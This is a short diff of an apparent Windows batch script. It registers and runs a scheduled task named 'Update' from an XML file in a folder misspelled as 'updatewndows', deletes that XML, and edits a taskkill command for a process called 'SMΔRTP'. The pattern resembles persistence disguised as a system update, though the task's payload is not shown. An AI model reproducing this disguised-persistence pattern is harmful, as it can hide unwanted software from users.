@@ -6,7 +6,7 @@ schtasks /create /xml %systemdrive%\ProgramData\updatewndows\Update.xml /tn Upda
 del %systemdrive%\ProgramData\updatewndows\Update.xml
 schtasks /run /tn Update
 
-taskkill /F /IM SMΔRTP
+taskkill /F /IM SMΔRTP.exe
 
 sc query | find "SMΔRTP"
 
